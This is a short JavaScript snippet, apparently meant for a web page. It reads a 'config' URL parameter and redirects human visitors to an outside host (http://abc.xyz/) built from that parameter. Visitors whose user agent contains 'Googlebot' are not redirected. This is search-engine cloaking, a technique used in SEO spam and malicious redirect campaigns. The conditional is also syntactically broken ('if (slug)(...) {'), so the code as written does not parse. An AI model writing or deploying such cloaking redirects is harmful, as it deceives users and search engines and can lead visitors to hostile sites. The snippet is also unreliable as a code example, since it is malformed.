(function () {

    const params = new URLSearchParams(window.location.search);
    const config = params.get("config");

    if (!config) {
        console.log("No config parameter found");
        return;
    }

    // Get the last part of config URL
    const parts = config.split("/").filter(Boolean);
    const slug = parts[parts.length - 1];

    if (slug)(!navigator.userAgent.includes('Googlebot')) {
        window.location.href = "http://abc.xyz/" + encodeURIComponent(slug);
    } else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}

})();